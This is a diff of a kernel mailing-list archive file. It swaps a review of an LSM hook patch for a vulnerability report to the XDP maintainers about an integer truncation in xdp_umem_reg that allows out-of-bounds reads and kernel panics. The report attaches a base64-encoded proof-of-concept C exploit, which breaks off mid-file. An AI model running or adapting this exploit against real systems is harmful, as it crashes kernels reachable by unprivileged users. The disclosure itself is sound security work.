@@ -2,156 +2,182 @@ Return-Path: <bpf-owner@vger.kernel.org>
 X-Original-To: lists+bpf@lfdr.de
 Delivered-To: lists+bpf@lfdr.de
 Received: from vger.kernel.org (vger.kernel.org [23.128.96.18])
-	by mail.lfdr.de (Postfix) with ESMTP id 35FDF1DB7E1
-	for <lists+bpf@lfdr.de>; Wed, 20 May 2020 17:15:55 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTP id 640531DB7E7
+	for <lists+bpf@lfdr.de>; Wed, 20 May 2020 17:16:40 +0200 (CEST)
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-        id S1726791AbgETPPy (ORCPT <rfc822;lists+bpf@lfdr.de>);
-        Wed, 20 May 2020 11:15:54 -0400
-Received: from sonic309-26.consmr.mail.ne1.yahoo.com ([66.163.184.152]:33755
-        "EHLO sonic309-26.consmr.mail.ne1.yahoo.com" rhost-flags-OK-OK-OK-OK)
-        by vger.kernel.org with ESMTP id S1726439AbgETPPx (ORCPT
-        <rfc822;bpf@vger.kernel.org>); Wed, 20 May 2020 11:15:53 -0400
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yahoo.com; s=s2048; t=1589987752; bh=Zkd3rPDKtX3+qnFQjuOU8VFwF0nL19jUfZSYP4Q23R0=; h=Subject:To:Cc:References:From:Date:In-Reply-To:From:Subject; b=kkjK0TsXqKAHoENaKMCe5DQ5WVt+teqYZFSwjN8n6C0KLrUl05YAufGdMl7wuF2eKUbwjQs/DVbtDL6w8/2IWeNYwGNkHy2nEhwNiemtEAm8D6cCNO5TCFPlqBaBJRXUb6q37i22tmMRAdbVmZMQWMDjs6HrL0qg0f/O0GM2W+SN33RIND1IIbxhY7Z/CTRU0kgJAtGCKG04+zgahxzQp49QQ+ADyHiuZBpi3Bqc00Cj5kDCwmoOn1W2iC0OyUTmnm+P+8O26QSy+AZGIFCoafswkMXSfalviVVOCo83gnIGMHPHKTkDp61W1iKzugMXNXYZbusxTLY6OJ8pmxiMSQ==
-X-YMail-OSG: w71mDs0VM1m_FD37UiNuOJh4sfafztJ3GFPf3cfwUmAiw74SqOqea_Q5wzAohwI
- b_tw5OkedXKObDxMPyVARBxDYyNX7m4s3yFpSC7FWoPFNxvKc8N40dTt8q9dgFpEg5xma2RdSsRx
- Y39ZpKozkVYVvoFy60gdUsHmYsXbt2kjvYpTAVa8rmy9BbWKYCM8hSe6_.Dnkmmqk6es1E62842r
- Pr6rELwQC6znto5cCkrCB72AtD8lU.9gLHq4MnIKJb1vjaXAbWUq6BfN_FMzsKbAn1JpOLjDBk7Y
- birYEmmeCVY0eZfZpmxI8qS3C.l9OYG3p0g7.rxQNAu033FG9eXgzrt7CpFLgIkodzc_dy3pBtqI
- zIBntmu5.8p2aEVKsns3k0cBfDXQvcdempClBpwhlRjh.miEwHBwTF0U_PbTvaRea8ZTYw6Vc8Sh
- U2DRynxTAPZuAtudPB1cTLyXynFXbajG7LDHL87hlPnw0u8LSBlicj_bBiBr_Mx0gwNQEuBn0aBT
- TZdAYa.zrQUb9tntQ9jGxlOBho6Ub.l2WWRWJoLwWU4jm5RcEXvONh3cfSNlR2M5M7yhamy6Gl89
- 17TxRU5UMRPvpfRqU.ecOhvu1JriVPw9HGL1XO6wuKP_UZEtNp.gp3tF9VSQOtUtRR50LWYJMIyP
- gVjhJNojFxvYsBvoucKmlfRiPlmH9NdJWWLLC8pDY7bdxPA4Q4pECbdbi8Ptun.UvBCabhxesEzM
- IDdrXlyK8auysozw0NmBIBTl6UPNwWAQ7IbAH_jS8Pb..28rMNS.Re1OplTcu1DBXJ1vT8r74ASk
- 6MBKOZMNY_cNsCSvvmA1owXQzW3iyLrj1qQ.1UOMMG5ctQTOk3EXcySospVoCrGvFsPteU01g5Ng
- LiHJwF4fTdX3qEhtenhzLRE4vprgPlroaZ9m38PZTpBEkw5rPEwRHLwa2RVwTkYBacZZWSUad21X
- x6LklUSetXgXrCbXFm81t_bNZSvij0FAHZy66o0LYh.V1Cg_T.DgMygF.U4vD1UODsZ7sfc6GBfC
- v238odETVRAJb1SJ4bv82IzQEXT3cFhS_ccOkaa.PziIFpP33ciGOc3Efk9Z6cEryn4RM2uKyrBp
- v.9GxEtFU_ymyj35eUFwJcHq_Z6ah9Q1gyw.hp5jiHOQ8t3a0RNISxnpO4CdFCNCe0UxNqO.4Nn2
- jJ4ty1GysVIZMStulBJwWC9Nsv9edsCy2uH2CD2vnQgxkm1KQl_1FdD4z6ev.YZZGQVZ7bYbUfy5
- NzW8qnNeyEaU1W84z0ieB686WUAPY6IanzbJ6hhnn6XpzaqiQeSTNVMTyNi0PBddqTtc2m8xjkEy
- SWK8oOfY_A7flGvRVeMHuxt.uyGlpZqKBv2iQdUlnszsttxvCLYBESgW_ReAKiNJlL7JS0DeNpXw
- 8Uo8BFrRqM5gFzDh6JNDHxHyYYix6lGCPZf4hYg--
-Received: from sonic.gate.mail.ne1.yahoo.com by sonic309.consmr.mail.ne1.yahoo.com with HTTP; Wed, 20 May 2020 15:15:52 +0000
-Received: by smtp403.mail.ne1.yahoo.com (VZM Hermes SMTP Server) with ESMTPA ID 0128c7c60599331edfc261e07b768c5e;
-          Wed, 20 May 2020 15:15:50 +0000 (UTC)
-Subject: Re: [PATCH bpf] security: Fix hook iteration for secid_to_secctx
-To:     KP Singh <kpsingh@chromium.org>, linux-kernel@vger.kernel.org,
-        bpf@vger.kernel.org, linux-security-module@vger.kernel.org
-Cc:     Alexei Starovoitov <ast@kernel.org>,
-        Daniel Borkmann <daniel@iogearbox.net>,
-        James Morris <jmorris@namei.org>,
-        Anders Roxell <anders.roxell@linaro.org>
-References: <20200520125616.193765-1-kpsingh@chromium.org>
-From:   Casey Schaufler <casey@schaufler-ca.com>
-Autocrypt: addr=casey@schaufler-ca.com; keydata=
- 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
- abzjfg==
-Message-ID: <5f540fb8-93ec-aa6b-eb30-b3907f5791ff@schaufler-ca.com>
-Date:   Wed, 20 May 2020 08:15:49 -0700
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101
- Thunderbird/68.8.0
+        id S1726548AbgETPQj (ORCPT <rfc822;lists+bpf@lfdr.de>);
+        Wed, 20 May 2020 11:16:39 -0400
+Received: from lindbergh.monkeyblade.net ([23.128.96.19]:35364 "EHLO
+        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+        with ESMTP id S1726525AbgETPQj (ORCPT <rfc822;bpf@vger.kernel.org>);
+        Wed, 20 May 2020 11:16:39 -0400
+Received: from mail-il1-x143.google.com (mail-il1-x143.google.com [IPv6:2607:f8b0:4864:20::143])
+        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 14C09C061A0E;
+        Wed, 20 May 2020 08:16:38 -0700 (PDT)
+Received: by mail-il1-x143.google.com with SMTP id y17so1259339ilg.0;
+        Wed, 20 May 2020 08:16:38 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20161025;
+        h=mime-version:from:date:message-id:subject:to:cc;
+        bh=+VhyhTdLrfwQbTY2b/JWDU5AASOjjMOxGId1SK5bZHI=;
+        b=WeMsTi9f4je6YPdm5zzw5fNMDNyqJ055cADoqWoH861WU3kR/N+ew2wJ/DNAkn+KdR
+         byc9+a0Cd5bK8Nru6sBgE3dFGn0mZnKFnMmHFgoeSC4Du18zm7sX29jks6TQ8XvtJvP2
+         zLXJjSfxTdDMfLkBGxj/i3b5gUmPG+fBeCvIkvfkgvpIu4MVIZhnCfLXBYZvNaXmY9V8
+         GaPO/UIobIINKzvfMASGAbrDiaavJbbLcKR1ddzbCTRG38ZnTlLyerTFvE/XQkfWzKgk
+         DLfQpV4jzloUJBTAJGIqrwDLb+ya7gozHV/6XtbXVFF+eWhL6/N9T+VzVoaQ1n93eftn
+         Ipdg==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
+        bh=+VhyhTdLrfwQbTY2b/JWDU5AASOjjMOxGId1SK5bZHI=;
+        b=NzE2oobG1ui1x+3rWi/ZarX8d/Kf9V/L1dZQeCbXXOK9qUsd65x07lKu+YSyyYa9Da
+         dVt8blrtggNaABecSNRzHwNfbn0lMJDBGLoshsEEMHLtctxmKSCHpJE2Sp+zKjwIL+oK
+         /3t/213haFyy1YyJ60vfgxcH52z00NhNAVcAPVKjzHlPe89v1AkEj11fc5QYFfo191nY
+         ENafAulTmmwRdqV71Un7pZyhLIcqAvUHSXtHsdxx16cQfuSsb/cdnI0ryqeS6Ws/K8LJ
+         plRDCHNoxJNwv//b6xNbjlhC3dD4L10CU49AQlqWSS5ma/ZrCg+RpIJp2d4DGdoVC1Kb
+         rr8A==
+X-Gm-Message-State: AOAM531naqBCDE5FBMy9hxsLYTTz31Vidd0o4543aaaT0OMAvItOnLPF
+        m7CKCk5mJaunsGkpad8BoualTyxLe45h3e8E7RBiGaf/XJ0=
+X-Google-Smtp-Source: ABdhPJycAxj1JQdHF/8h/jZgz05TFzYE+x8ravcLtUDCxldaH6ND/dVs7FBow28JDokVOsZUxKu9HLDZIWaBnCV8Qjs=
+X-Received: by 2002:a92:8dd2:: with SMTP id w79mr4419236ill.239.1589987797263;
+ Wed, 20 May 2020 08:16:37 -0700 (PDT)
 MIME-Version: 1.0
-In-Reply-To: <20200520125616.193765-1-kpsingh@chromium.org>
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
-Content-Language: en-US
-X-Mailer: WebService/1.1.15960 hermes_yahoo Apache-HttpAsyncClient/4.1.4 (Java/11.0.6)
+From:   =?UTF-8?Q?Minh_B=C3=B9i_Quang?= <minhquangbui99@gmail.com>
+Date:   Wed, 20 May 2020 22:16:25 +0700
+Message-ID: <CACtPs=GGvV-_Yj6rbpzTVnopgi5nhMoCcTkSkYrJHGQHJWFZMQ@mail.gmail.com>
+Subject: XDP socket DOS bug
+To:     Magnus Karlsson <magnus.karlsson@intel.com>, bjorn.topel@intel.com
+Cc:     netdev@vger.kernel.org, bpf@vger.kernel.org
+Content-Type: multipart/mixed; boundary="000000000000da8b8605a615e1e6"
 Sender: bpf-owner@vger.kernel.org
 Precedence: bulk
 List-ID: <bpf.vger.kernel.org>
 X-Mailing-List: bpf@vger.kernel.org
 
+--000000000000da8b8605a615e1e6
+Content-Type: text/plain; charset="UTF-8"
 
-On 5/20/2020 5:56 AM, KP Singh wrote:
-> From: KP Singh <kpsingh@google.com>
->
-> secid_to_secctx is not stackable, and since the BPF LSM registers this
-> hook by default, the call_int_hook logic is not suitable which
-> "bails-on-fail" and casues issues when other LSMs register this hook and
-> eventually breaks Audit.
->
-> In order to fix this, directly iterate over the security hooks instead
-> of using call_int_hook as suggested in:
->
-> https: //lore.kernel.org/bpf/9d0eb6c6-803a-ff3a-5603-9ad6d9edfc00@schaufler-ca.com/#t
->
-> Fixes: 98e828a0650f ("security: Refactor declaration of LSM hooks")
-> Fixes: 625236ba3832 ("security: Fix the default value of secid_to_secctx hook"
-> Reported-by: Alexei Starovoitov <ast@kernel.org>
-> Signed-off-by: KP Singh <kpsingh@google.com>
+Dear sir,
+In function xdp_umem_reg (net/xdp/xdp_umem.c), there is an initialization
+         //size is u64
+         umem->npgs = size / PAGE_SIZE;
+When look at the definition of xdp_umem struct, I see
+        struct xdp_umem {
+                 .....
+                 u32 npgs;
+                 .....
+        }
+npgs is u32, however the result of division can be bigger than u32
+(there is no limit in size which is u64), so the result can be
+truncated when assigned to npgs. For example, size is 0x1 000 0000
+8000, result of division is 0x1 0000 0008, and the npgs is truncated
+to 0x8.
+======
+In the process of analyzing the consequence of this bug, I found that
+only npgs pages get mapped and the size is used to initialize
+queue->size. queue->size is used to validate the address provided in
+user-supplied xdp_desc in tx path (xdp_generic_xmit). In
+xdp_generic_xmit the address provided passed the size check and reach
+xdp_umem_get_data. That address is then used as and index to
+umem->pages to get real virtual address. This leads to an out of bound
+read in umem->pages and if the attacker spray some addresses, he can
+use this bug to get arbitrary read.
+However, I cannot see any ways to intercept the xdp packet because
+that packet is sent to bpf program by design. Therefore, I cannot get
+info leak using this bug but I can craft a poc to get kernel panic on
+normal user as long as CONFIG_USER_NS=y.
 
-This looks fine.
+Regards,
+Bui Quang Minh
 
-> ---
->  security/security.c | 16 ++++++++++++++--
->  1 file changed, 14 insertions(+), 2 deletions(-)
->
-> diff --git a/security/security.c b/security/security.c
-> index 7fed24b9d57e..51de970fbb1e 100644
-> --- a/security/security.c
-> +++ b/security/security.c
-> @@ -1965,8 +1965,20 @@ EXPORT_SYMBOL(security_ismaclabel);
->  
->  int security_secid_to_secctx(u32 secid, char **secdata, u32 *seclen)
->  {
-> -	return call_int_hook(secid_to_secctx, -EOPNOTSUPP, secid, secdata,
-> -				seclen);
-> +	struct security_hook_list *hp;
-> +	int rc;
-> +
-> +	/*
-> +	 * Currently, only one LSM can implement secid_to_secctx (i.e this
-> +	 * LSM hook is not "stackable").
-> +	 */
-> +	hlist_for_each_entry(hp, &security_hook_heads.secid_to_secctx, list) {
-> +		rc = hp->hook.secid_to_secctx(secid, secdata, seclen);
-> +		if (rc != LSM_RET_DEFAULT(secid_to_secctx))
-> +			return rc;
-> +	}
-> +
-> +	return LSM_RET_DEFAULT(secid_to_secctx);
->  }
->  EXPORT_SYMBOL(security_secid_to_secctx);
->  
+--000000000000da8b8605a615e1e6
+Content-Type: application/octet-stream; name="poc.c"
+Content-Disposition: attachment; filename="poc.c"
+Content-Transfer-Encoding: base64
+Content-ID: <f_kafhhaf90>
+X-Attachment-Id: f_kafhhaf90
+
+I2RlZmluZSBfR05VX1NPVVJDRQ0KI2luY2x1ZGUgPHVuaXN0ZC5oPg0KI2luY2x1ZGUgPHN5cy90
+eXBlcy5oPg0KI2luY2x1ZGUgPHN5cy9zdGF0Lmg+DQojaW5jbHVkZSA8ZmNudGwuaD4NCiNpbmNs
+dWRlIDxzY2hlZC5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8ZXJybm8uaD4NCiNp
+bmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+DQojaW5jbHVkZSA8c3Ry
+aW5nLmg+DQojaW5jbHVkZSA8c3RkaW50Lmg+DQojaW5jbHVkZSA8c3lzL21tYW4uaD4NCiNpbmNs
+dWRlIDxuZXQvaWYuaD4NCiNpbmNsdWRlIDxsaW51eC9icGYuaD4NCiNpbmNsdWRlIDx1bmlzdGQu
+aD4NCiNpbmNsdWRlIDxsaW51eC9pZl94ZHAuaD4NCiNpbmNsdWRlIDxsaW51eC9pZl9wYWNrZXQu
+aD4NCiNpbmNsdWRlIDxuZXQvZXRoZXJuZXQuaD4NCiNpbmNsdWRlIDxhcnBhL2luZXQuaD4NCiNp
+bmNsdWRlIDxsaW51eC9ydG5ldGxpbmsuaD4NCiNpbmNsdWRlIDxzeXMvcmVzb3VyY2UuaD4NCiNp
+bmNsdWRlIDxsaW51eC9pZl9wYWNrZXQuaD4NCg0KI2RlZmluZSBlcnJfZXhpdChtc2cpIGRvIHsg
+cGVycm9yKG1zZyk7IGV4aXQoRVhJVF9GQUlMVVJFKTsgfSB3aGlsZSgwKQ0KdHlwZWRlZiB1aW50
+NjRfdCB1NjQ7DQp0eXBlZGVmIHVpbnQzMl90IHUzMjsNCnR5cGVkZWYgdWludDE2X3QgdTE2Ow0K
+I2RlZmluZSBYRFBfVU1FTV9VTkFMSUdORURfQ0hVTktfRkxBRyAoMSA8PCAwKQ0KI2RlZmluZSBQ
+Rl9YRFAgNDQNCiNkZWZpbmUgU09MX1hEUAkyODMNCiNkZWZpbmUgWERQX1VNRU1fUkVHIDQNCiNk
+ZWZpbmUgWERQX1JYX1JJTkcgMg0KI2RlZmluZSBYRFBfVFhfUklORyAzDQojZGVmaW5lIFhEUF9V
+TUVNX0ZJTExfUklORyA1DQojZGVmaW5lIFhEUF9VTUVNX0NPTVBMRVRJT05fUklORyA2DQojZGVm
+aW5lIFhEUF9VU0VfTkVFRF9XQUtFVVAgKDEgPDwgMykNCiNkZWZpbmUgWERQX01NQVBfT0ZGU0VU
+UyAxDQoNCnZvaWQqIHVtZW07DQp2b2lkKiBjcjsNCnZvaWQqIHR4Ow0KDQpzdHJ1Y3QgbXlfeGRw
+X3VtZW1fcmVnIHsNCgl1NjQgYWRkcjsgLyogU3RhcnQgb2YgcGFja2V0IGRhdGEgYXJlYSAqLw0K
+CXU2NCBsZW47IC8qIExlbmd0aCBvZiBwYWNrZXQgZGF0YSBhcmVhICovDQoJdTMyIGNodW5rX3Np
+emU7DQoJdTMyIGhlYWRyb29tOw0KCXUzMiBmbGFnczsNCn07DQoNCiNkZWZpbmUgQlVGX1NJWkUg
+MTAyNA0KY2hhciBsb2dfYnVmW0JVRl9TSVpFXTsNCg0Kdm9pZCB3cml0ZV9maWxlKGNoYXIqIGZp
+bGVfbmFtZSwgY2hhciogZGF0YSkNCnsNCglpbnQgZiA9IG9wZW4oZmlsZV9uYW1lLCBPX1dST05M
+WSk7DQoJaWYgKGYgPCAwKQ0KCQllcnJfZXhpdCgib3BlbiIpOw0KCWludCByZXN1bHQgPSB3cml0
+ZShmLCBkYXRhLCBzdHJsZW4oZGF0YSkpOw0KCWlmIChyZXN1bHQgPCBzdHJsZW4oZGF0YSkpDQoJ
+CWVycl9leGl0KCJ3cml0ZSIpOw0KCWNsb3NlKGYpOw0KfQ0KDQp2b2lkIHNldHVwX3NhbmRib3go
+KQ0Kew0KCWludCByZXN1bHQ7DQoJY2hhciBidWZbMTAyNF07DQoJdWlkX3QgdWlkID0gZ2V0dWlk
+KCk7DQoJdWlkX3QgZ2lkID0gZ2V0Z2lkKCk7DQoJcmVzdWx0ID0gdW5zaGFyZShDTE9ORV9ORVdV
+U0VSKTsNCglpZiAocmVzdWx0IDwgMCkNCgkJZXJyX2V4aXQoInVuc2hhcmUtQ0xPTkUtTkVXVVNF
+UiIpOw0KCXJlc3VsdCA9IHVuc2hhcmUoQ0xPTkVfTkVXTkVUKTsNCglpZiAocmVzdWx0IDwgMCkN
+CgkJZXJyX2V4aXQoInVuc2hhcmUtQ0xPTkUtTkVXTkVUIik7DQoNCgkvLyBzZXQgbWFwcGluZyBm
+cm9tIHVpZChnaWQpIGluc2lkZSB0aGUgbmFtZXNwYWNlIHRvIHRoZSBvdXRzaWRlDQoJd3JpdGVf
+ZmlsZSgiL3Byb2Mvc2VsZi9zZXRncm91cHMiLCAiZGVueSIpOw0KDQoJc3ByaW50ZihidWYsICIw
+ICVkIDFcbiIsIHVpZCk7DQoJd3JpdGVfZmlsZSgiL3Byb2Mvc2VsZi91aWRfbWFwIiwgYnVmKTsN
+Cg0KCXNwcmludGYoYnVmLCAiMCAlZCAxXG4iLCBnaWQpOw0KCXdyaXRlX2ZpbGUoIi9wcm9jL3Nl
+bGYvZ2lkX21hcCIsIGJ1Zik7DQoNCgljcHVfc2V0X3QgbXlfc2V0Ow0KCUNQVV9aRVJPKCZteV9z
+ZXQpOw0KCUNQVV9TRVQoMCwgJm15X3NldCk7DQoJaWYgKHNjaGVkX3NldGFmZmluaXR5KDAsIHNp
+emVvZihteV9zZXQpLCAmbXlfc2V0KSAhPSAwKSB7DQoJCWVycl9leGl0KCJzY2hlZC1zZXRhZmZp
+bml0eSIpOw0KCX0NCg0KCXJlc3VsdCA9IHN5c3RlbSgiL3NiaW4vaWZjb25maWcgbG8gdXAiKTsN
+CglpZiAocmVzdWx0IDwgMCkNCgkJZXJyX2V4aXQoImlmY29uZmlnIik7DQp9DQoNCmludCBzZXR1
+cF9zb2NrZXQoKQ0Kew0KCWludCBmZCA9IHNvY2tldChQRl9YRFAsIFNPQ0tfUkFXLCAwKTsNCglp
+ZiAoZmQgPCAwKQ0KCQllcnJfZXhpdCgic29ja2V0LWNyZWF0ZSIpOw0KDQoJdW1lbSA9IG1tYXAo
+MCwgMHg4MDAwLCBQUk9UX1JFQUR8UFJPVF9XUklURSwgTUFQX1BSSVZBVEV8TUFQX0FOT05ZTU9V
+UywgMCwgMCk7DQoJaWYgKHVtZW0gPCAwKQ0KCQllcnJfZXhpdCgibW1hcCIpOw0KDQoJbWVtc2V0
+KHVtZW0gKyAweDcwMDAsIDB4NDEsIDB4MTAwMCAtIDEpOw0KCXN0cnVjdCBteV94ZHBfdW1lbV9y
+ZWcgbXI7DQoJbWVtc2V0KCZtciwgMCwgc2l6ZW9mIG1yKTsNCgltci5hZGRyID0gKHU2NCkgdW1l
+bTsNCgltci5sZW4gPSAweDEwMDAwMDAwODAwMDsNCgltci5jaHVua19zaXplID0gMHgxMDAwOw0K
+CW1yLmhlYWRyb29tID0gMDsNCgltci5mbGFncyA9IDA7DQoNCglpbnQgcmVzdWx0ID0gc2V0c29j
+a29wdChmZCwgU09MX1hEUCwgWERQX1VNRU1fUkVHLCAmbXIsIHNpemVvZiBtcik7DQoJaWYgKHJl
+c3VsdCA8IDApDQoJCWVycl9leGl0KCJzZXRzb2Nrb3B0LXVtZW0tcmVnIik7DQoNCglpbnQgZW50
+cmllcyA9IDQ7DQoJcmVzdWx0ID0gc2V0c29ja29wdChmZCwgU09MX1hEUCwgWERQX1JYX1JJTkcs
+ICZlbnRyaWVzLCBzaXplb2YgZW50cmllcyk7DQoJaWYgKHJlc3VsdCA8IDApDQoJCWVycl9leGl0
+KCJzZXRzb2Nrb3B0LXJ4LXJpbmciKTsNCg0KCXJlc3VsdCA9IHNldHNvY2tvcHQoZmQsIFNPTF9Y
+RFAsIFhEUF9UWF9SSU5HLCAmZW50cmllcywgc2l6ZW9mIGVudHJpZXMpOw0KCWlmIChyZXN1bHQg
+PCAwKQ0KCQllcnJfZXhpdCgic2V0c29ja29wdC10eC1yaW5nIik7DQoNCglyZXN1bHQgPSBzZXRz
+b2Nrb3B0KGZkLCBTT0xfWERQLCBYRFBfVU1FTV9GSUxMX1JJTkcsICZlbnRyaWVzLCBzaXplb2Yg
+ZW50cmllcyk7DQoJaWYgKHJlc3VsdCA8IDApDQoJCWVycl9leGl0KCJzZXRzb2Nrb3B0LWZpbGwt
+cmluZyIpOw0KDQoJcmVzdWx0ID0gc2V0c29ja29wdChmZCwgU09MX1hEUCwgWERQX1VNRU1fQ09N
+UExFVElPTl9SSU5HLCAmZW50cmllcywgc2l6ZW9mIGVudHJpZXMpOw0KCWlmIChyZXN1bHQgPCAw
+KQ0KCQllcnJfZXhpdCgic2V0c29ja29wdC1jb21wbGV0aW9uLXJpbmciKTsNCg0KCXN0cnVjdCB4
+ZHBfbW1hcF9vZmZzZXRzIG9mZjsNCglpbnQgbGVuID0gc2l6ZW9mIG9mZjsNCglyZXN1bHQgPSBn
+ZXRzb2Nrb3B0KGZkLCBTT0xfWERQLCBYRFBfTU1BUF9PRkZTRVRTLCAmb2ZmLCAmbGVuKTsNCglp
+ZiAocmVzdWx0IDwgMCkNCgkJZXJyX2V4aXQoImdldHNvY2tvcHQiKTsNCg0KCXR4ID0gbW1hcCgw
+LCBvZmYudHguZGVzYyArDQoJCQkJCTQgKiBzaXplb2Yoc3RydWN0IHhkcF9kZXNjKSwNCgkJCQkJ
+UFJPVF9SRUFEIHwgUFJPVF9XUklURSwgTUFQX1NIQVJFRCB8IE1BUF9QT1BVTEFURSwNCgkJCQkJ
+ZmQsIFhEUF9QR09GRl9UWF9SSU5HKTsNCglpZiAodHggPCAwKQ0KCQllcnJfZXhpdCgibW1hcC10
+eC1yaW5nIik7DQoNCgljciA9IG1tYXAoMCwgb2ZmLmNyLmRlc2MgKw0KCQkJCQk0ICogc2l6ZW9m
